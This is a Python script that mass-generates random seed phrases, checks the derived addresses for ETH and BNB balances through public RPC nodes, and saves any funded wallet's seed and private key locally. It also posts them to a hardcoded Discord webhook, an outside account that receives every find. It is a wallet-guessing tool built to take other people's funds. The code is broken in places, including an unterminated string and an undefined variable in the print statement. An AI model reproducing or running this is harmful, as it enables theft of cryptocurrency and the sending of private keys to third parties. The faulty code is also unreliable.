import os
import sys
import asyncio
import aiohttp
import random
import mnemonic
import requests
import multiprocessing
from colorama import Fore , Style , Back
from hexer import mHash
from datetime import datetime
from multiprocessing import Pool
from cryptofuzz import Convertor, Ethereum
from mnemonic import Mnemonic
from blessed import Terminal

conv = Convertor()
eth = Ethereum()

servers = [
    'https://rpc.ankr.com/eth',
    "https://gateway.subquery.network/rpc/eth",
    "https://api.tatum.io/v3/blockchain/node/ethereum-mainnet",
    "https://api.stateless.solutions/ethereum/v1/demo",
    "https://eth.nodeconnect.org",
    "https://gateway.tenderly.co/public/mainnet",
    "https://eth.drpc.org",
    "https://eth.meowrpc.com",
    "https://eth.public-rpc.com",
    "https://eth-mainnet.public.blastapi.io"
]
bnbServer = [
    "https://bsc-pokt.nodies.app",
    "https://rpc-bsc.bnb48.club/",
    "https://bscrpc.com",
    "https://bsc.blockpi.network/v1/rpc/public",
    "https://rpc.ankr.com/bsc",
    "https://binance.llamarpc.com",
    "https://bsc-dataseed.bnbchain.org",
    "https://bsc-dataseed1.bnbchain.org",
    "https://bsc-dataseed2.bnbchain.org",
    "https://bsc-dataseed3.bnbchain.org",
    "https://bsc-dataseed4.bnbchain.org",
    "https://endpoints.omniatech.io/v1/bsc/mainnet/public",
    "https://bsc-rpc.publicnode.com",
    "https://bsc-mainnet.public.blastapi.io",
    "https://bsc.meowrpc.com",
    "https://bsc.drpc.org",
    "https://public.stackup.sh/api/v1/node/bsc-mainnet",
    "https://api.tatum.io/v3/blockchain/node/bsc-mainnet",
]

def OnClear():
    if "win" in sys.platform.lower():
        os.system("cls")
    else:
        os.system("clear")

def message(title, message):
    embered = { 'title': message }
    headers = { "Content-Type": "application/json" }
    data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title), 'embeds': [embered]}
    webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
    requests.post(webhook_url, json=data, headers=headers)

def timer() :
    tcx = datetime.now().time()
    return tcx

async def fetch_url(session, url, type):
    server = random.choice(servers) if type == 'ETH' else random.choice(bnbServer)
    payload = {"id":1,"jsonrpc":"2.0","method":"eth_getBalance","params":[url.get('address'), "latest"]}
    async with session.post(server, json=payload) as response:
        data = await response.json()
        decimal_balance = int(data.get('result', '0x0'), 16)
        balance = decimal_balance / (10 ** 18)
        return {'address': str(type) + '-' + url.get('address'), 'balance': balance }

async def call_api_urls(api_urls):
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_url(session, url, 'ETH') for url in api_urls] + [fetch_url(session, url, 'BNB') for url in api_urls]
        responses = await asyncio.gather(*tasks)
        return responses

async def get_balance(wallets):
    try:
        urls = [{'address': wallet['address']} for wallet in wallets]
        response = await call_api_urls(urls)
        return {item.get('address'): float(item.get('balance')) for item in response}
    except Exception as error:
        print('Error: ', error)
        return {}

r = 1
cores = 4
threads = 10

def generate_wallets():
    wallets = []
    for r in range(threads):
        mne = Mnemonic("english")
        NumberList = [128, 256]
        randomSize = random.choice(NumberList)
        words = mne.generate(strength=randomSize)
        priv = conv.mne_to_hex(words)
        addr = eth.hex_addr(priv)

        # Append the dictionary to the wallet list
        wallets.append({
            "seed": words,
            "address": addr,
            "private_key": priv
        })

    return wallets

async def seek(i) :
    z = 0
    w = 0

    while True :
        txx = timer()
        wallets = generate_wallets()
        balances = await get_balance(wallets)
        z += len(wallets) * cores

        for ck in wallets:
            addr = ck.get('address')
            seed = ck.get('seed');
            private_key = ck.get('private_key')
          
            balanceETH = balances.get(f"ETH-{addr}", 0)
            balanceBNB = balances.get(f"BNB-{addr}", 0)

            print(Fore.GREEN , f"[CPU{i}][C: {z} / W: {w}]", Fore.BLUE , f"{str(address)} - {str(seed)}" , Fore.RED ,' [' + str(balanceETH) +' ETH]',' [' + str(balanceBNB) +' BNB] , Fore.WHITE , Style.RESET_ALL)

            if balanceETH > 0:
                w += 1
          
                message('NEW ETH WALLET IS FOUND!', f"[{balanceETH} ETH] \n Address: [{addr}] \n Seed: [{seed}] \n Private: [{private_key}]")
          
                f = open("winner-eth.txt" , "a")
                f.write('\n' + str(addr))
                f.write('\n' + str(seed))
                f.write('\n' + str(private_key))
                f.write('\n' + str(balanceETH) + ' ETH')
                f.write('\n==========[PROGRAMMER BY MALPHITE]==========\n')
                f.close()

                continue

            if balanceBNB > 0:
                w += 1
              
                message('NEW BNB WALLET IS FOUND!', f"[{balanceBNB} BNB] \n Address: [{addr}] \n Seed: [{seed}] \n Private: [{private_key}]")
              
                f = open("winner.txt" , "a")
                f.write('\n' + str(addr))
                f.write('\n' + str(seed))
                f.write('\n' + str(private_key))
                f.write('\n' + str(balanceBNB) + ' ETH')
                f.write('\n==========[PROGRAMMER BY MALPHITE]==========\n')
                f.close()

                continue
               

def run(handler, i):
    return asyncio.run(handler(i))
    
if __name__ == '__main__':
    OnClear()
    for i in range(cores):
        p = multiprocessing.Process(target=run, args=(seek, i,))
        p.start()
